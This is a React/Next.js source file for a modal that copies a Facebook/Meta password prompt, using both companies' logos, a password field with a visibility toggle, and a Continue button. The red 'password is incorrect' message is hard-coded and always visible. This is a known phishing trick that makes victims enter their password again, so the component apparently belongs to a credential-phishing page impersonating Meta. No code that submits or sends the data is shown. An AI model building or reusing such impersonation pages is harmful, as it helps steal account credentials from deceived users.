import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { type FC, useState } from 'react';

const PasswordModal: FC = () => {
    const [showPassword, setShowPassword] = useState(false);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <Image src={FacebookLogoImage} alt='' className='mt-9 h-[70px] w-[70px]' />
                <div className='flex w-full flex-1 flex-col justify-center'>
                    <div className='relative w-full'>
                        <input type={showPassword ? 'text' : 'password'} id='password-input' className='peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Password' />
                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            Password
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                    </div>
                    <p className='mt-2 text-[15px] text-red-500'>The password that you&apos;ve entered is incorrect.</p>
                    <button type='submit' className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
                        Continue
                    </button>
                </div>
                <div className='flex items-center justify-center pt-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
